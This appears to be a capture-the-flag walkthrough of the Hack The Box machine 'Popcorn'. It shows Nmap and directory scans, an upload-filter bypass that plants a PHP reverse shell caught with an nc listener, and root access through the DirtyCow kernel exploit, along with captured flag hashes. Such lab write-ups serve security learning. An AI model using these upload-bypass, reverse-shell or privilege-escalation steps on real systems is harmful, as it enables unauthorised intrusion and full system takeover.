# Popcorn
## Reconnaissance

* Performed TCP scans using Nmap. (Did not include UDP and other TCP scans)
```
sudo nmap -sC -sS -sV -A 10.10.10.6
```
* The results of the Nmap show that TCP port 22 and 80 are open. Target machine OS is Ubuntu Linux.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|WAP|printer|phone|storage-misc|remote management
Running (JUST GUESSING): Linux 2.6.X|2.4.X (93%), AVM embedded (92%), Canon embedded (92%), Google Android 2.X (92%), LG embedded (92%), Epson embedded (91%), Avocent embedded (90%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/h:avm:fritz%21box_fon_wlan_7240 cpe:/h:canon:imagerunner_advance_c3320i cpe:/h:canon:imagerunner_advance_c3325 cpe:/o:google:android:2.3.5 cpe:/h:lg:n4b2nd4 cpe:/h:epson:wf-2660 cpe:/o:linux:linux_kernel:2.4.20
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (93%), AVM FRITZ!Box FON WLAN 7240 WAP (92%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (92%), Android 2.3.5 (Linux 2.6) (92%), Linux 2.6.30 (92%), Linux 2.6.32 (92%), Linux 2.6.35 (92%), LG N4B2ND4 NAS device (Linux 2.6) (92%), Epson WF-2660 printer (91%), Linux 2.4.20 (Red Hat 7.2) (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* Web enumeration
```
dirbuster for http://10.10.10.6
Threads:30
extensions:php,aspx,asp,txt
not recursive
```
* Webscan Results
```
```

* Access http://10.10.10.6/test.php, which runs phpinfo
```
System 	Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686
Build Date 	May 2 2011 22:56:18
Server API 	Apache 2.0 Handler
Virtual Directory Support 	disabled
Configuration File (php.ini) Path 	/etc/php5/apache2
Loaded Configuration File 	/etc/php5/apache2/php.ini
Scan this dir for additional .ini files 	/etc/php5/apache2/conf.d
additional .ini files parsed 	/etc/php5/apache2/conf.d/gd.ini, /etc/php5/apache2/conf.d/mysql.ini, /etc/php5/apache2/conf.d/mysqli.ini, /etc/php5/apache2/conf.d/pdo.ini, /etc/php5/apache2/conf.d/pdo_mysql.ini
PHP API 	20041225
PHP Extension 	20060613
Zend Extension 	220060519
Debug Build 	no
Thread Safety 	disabled
Zend Memory Manager 	enabled
IPv6 Support 	enabled
Registered PHP Streams 	https, ftps, compress.zlib, compress.bzip2, php, file, data, http, ftp, zip
Registered Stream Socket Transports 	tcp, udp, unix, udg, ssl, sslv3, sslv2, tls
Registered Stream Filters 	zlib.*, bzip2.*, convert.iconv.*, string.rot13, string.toupper, string.tolower, string.strip_tags, convert.*, consumed 
```

## Delivery & Exploitation

* Access http://10.10.10.6/torrent. Runs Torrent Hoster.
* Tried uploading php file but failed. Uploaded kali linux torrent file instead.
![image](https://raw.githubusercontent.com/kookiecrack/images/main/torrent.png)

* Tried uploading php file for screenshot image but failed. Used burp suite to intercept the HTTP packets.
```
Change 'Content-Type: application/x-php' to 'Content-Type: image/png' and use Repeater to send HTTP POST request.
Upload success!
Access reverse php shell from http://10.10.10.6/torrent/uploads
```
![image](https://raw.githubusercontent.com/kookiecrack/images/main/Burp.png)

* Reverse php web shell obtained

```
kali@kali:~/HTB/popcorn$ nc -nvlp 4444   
listening on [any] 4444 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.6] 45090
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 18:09:19 up  7:48,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
$ whoami
www-data
```

## Privilege Escalation
* google search for linux 2.6.31 local privilege escalation revealed potential 'dirtycow' exploit. 
* Successfully priv esc using [FireFart's exploit](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)
* Transferred exploit using wget and python SimpleHTTPServer
```

$ cat user.txt
7f7996604baa821f2644bb0da8fa1cd8
firefart@popcorn:/tmp# whoami
whoami
firefart
firefart@popcorn:/tmp# id
id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@popcorn:/tmp# cat /root/root.txt
cat /root/root.txt
9cb1e1150e46be0cc7c0247c7dff7b9a
firefart@popcorn:/tmp# ifconfig
ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:33:3f  
          inet addr:10.10.10.6  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:333f/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:333f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1276815 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1171211 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:326685100 (326.6 MB)  TX bytes:286452794 (286.4 MB)
          Interrupt:18 Base address:0x2024 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1288 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1288 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:131698 (131.6 KB)  TX bytes:131698 (131.6 KB)
```
